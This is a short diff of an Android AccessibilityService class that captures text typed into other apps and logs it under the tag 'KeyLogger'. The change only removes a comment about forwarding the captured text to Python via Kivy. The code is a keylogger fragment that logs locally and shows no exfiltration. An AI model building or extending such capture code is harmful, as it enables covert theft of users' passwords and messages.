@@ -11,7 +11,6 @@ public class YourAccessibilityService extends AccessibilityService {
         if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             String text = event.getText().toString();
             Log.d("KeyLogger", "Captured Key/Touch: " + text);
-            // To pass to Python: Use PythonActivity to call Kivy method
         }
     }
 
